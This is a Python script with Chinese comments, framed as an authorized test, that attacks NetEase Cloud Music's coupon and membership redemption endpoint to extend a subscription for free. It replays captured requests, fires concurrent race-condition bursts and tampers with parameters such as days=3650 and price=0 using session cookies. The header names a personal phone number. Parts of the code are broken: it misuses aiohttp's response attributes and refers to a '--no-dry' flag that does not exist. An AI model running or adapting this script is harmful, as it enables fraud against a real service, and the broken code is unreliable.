#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
exchange-probe.py —— 会员兑换/领券接口的授权测试脚手架

用途：验证你家账号（18775150652 那个）在兑换券流程上是否存在可被重复利用的缺陷。
这是唯一可能"真把到期时间推后"的方向——所有其它路子都只能改显示。

测试的四个经典缺陷：
  1. 幂等缺失：同一个券码/活动 ID 重复提交都成功 → 累加天数
  2. 客户端校验：前端限制"每人一次"，后端不校验
  3. 并发竞态：同时发 N 个相同请求，扣一次库存但发 N 份
  4. 参数篡改：days / goodsId / price 由客户端传，服务端照单全收

用法（先抓包，把真实请求填进 REQUESTS 里）：
    python3 exchange-probe.py --dry-run          # 只打印将要发的请求
    python3 exchange-probe.py --mode replay      # 串行重放，看是否每次都成功
    python3 exchange-probe.py --mode race -n 20  # 并发 20 个，看是否超发

⚠️ 只在你自己账号上跑。请求间隔 ≥1s，并发上限 20，别把账号玩进风控。
"""
import argparse
import asyncio
import json
import time
from dataclasses import dataclass, field

# ---------------------------------------------------------------- 抓包后填这里
TEMPLATE = {
    "url": "https://music.163.com/weapi/PATH_FROM_CAPTURE",   # 占位：真实路径
    "headers": {
        "Cookie": "MUSIC_U=PLACEHOLDER; MUSIC_A=PLACEHOLDER; __csrf=PLACEHOLDER",
        "User-Agent": "Mozilla/5.0",
        "Referer": "https://music.163.com/",
    },
    # weapi 的 body 是 params/encSecKey 两个字段；原样复制即可（同一请求体可重放）
    "body": {
        "params": "CAPTURED_PARAMS_BLOB",
        "encSecKey": "CAPTURED_ENCSECKEY_BLOB",
    },
}

# 想测参数篡改时，在这里写几组变体（字段名按抓包结果改）
VARIANTS = [
    {},                                   # 原样
    {"days": "3650"},                     # 天数放大
    {"goodsId": "1", "num": "365"},       # 数量放大
    {"price": "0"},                       # 价格归零
]

SUCCESS_CODES = (200,)


@dataclass
class Result:
    ok: int = 0
    fail: int = 0
    codes: dict = field(default_factory=dict)
    bodies: list = field(default_factory=list)


def build_body(extra: dict) -> dict:
    """把变体塞进已加密的 body 里——只对未加密字段有效；加密字段需重新加密（见 README）"""
    body = dict(TEMPLATE["body"])
    if extra:
        # 如果是明文接口（非 weapi），直接合并
        body.update(extra)
    return body


async def one(session, sem, extra, delay, out: Result):
    async with sem:
        await asyncio.sleep(delay)
        try:
            r = await session.post(
                TEMPLATE["url"], headers=TEMPLATE["headers"], data=build_body(extra), timeout=15
            )
            code = r.status_code
            out.codes[code] = out.codes.get(code, 0) + 1
            text = r.text[:300]
            if code in SUCCESS_CODES:
                out.ok += 1
            else:
                out.fail += 1
            if len(out.bodies) < 10:
                out.bodies.append(text)
        except Exception as e:
            out.fail += 1
            out.bodies.append(f"ERR {type(e).__name__}: {e}")


async def run(mode: str, n: int, dry: bool):
    try:
        import aiohttp
    except ImportError:
        raise SystemExit("pip install aiohttp")

    out = Result()
    if dry:
        print("URL :", TEMPLATE["url"])
        print("HEAD:", json.dumps(TEMPLATE["headers"], ensure_ascii=False)[:200])
        for i, v in enumerate(VARIANTS, 1):
            print(f"变体{i}:", json.dumps(build_body(v), ensure_ascii=False)[:200])
        print(f"\n模式={mode} 次数={n}（加 --no-dry 才会真的发）")
        return

    sem = asyncio.Semaphore(5)
    async with aiohttp.ClientSession() as s:
        if mode == "replay":
            for i in range(n):
                await one(s, sem, {}, 1.0, out)
                print(f"  #{i+1} ok={out.ok} fail={out.fail} codes={out.codes}")
        elif mode == "race":
            await asyncio.gather(*[one(s, sem, {}, 0, out) for _ in range(n)])
        elif mode == "tamper":
            for v in VARIANTS:
                await one(s, sem, v, 1.0, out)
                print(f"  变体 {v} → ok={out.ok} fail={out.fail}")

    print("\n== 结果 ==")
    print(f"成功 {out.ok} / 失败 {out.fail}  状态码分布 {out.codes}")
    for b in out.bodies:
        print(" -", b.replace("\n", " ")[:200])
    print("""
怎么判断是真漏洞：
  · replay 模式下，第 2 次及以后仍返回 200 且返回体里 expireTime 变长 → 幂等缺失，真漏洞
  · race 模式下 20 个请求里成功数 > 1 且天数只扣一次 → 竞态，真漏洞
  · 都返回 4xx/业务错误码（如 400 参数错误、403 无权限）→ 后端有校验，此路不通
""")


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--mode", choices=["replay", "race", "tamper"], default="replay")
    ap.add_argument("-n", type=int, default=5)
    ap.add_argument("--dry-run", action="store_true")
    args = ap.parse_args()
    asyncio.run(run(args.mode, min(args.n, 20), args.dry_run))


if __name__ == "__main__":
    main()
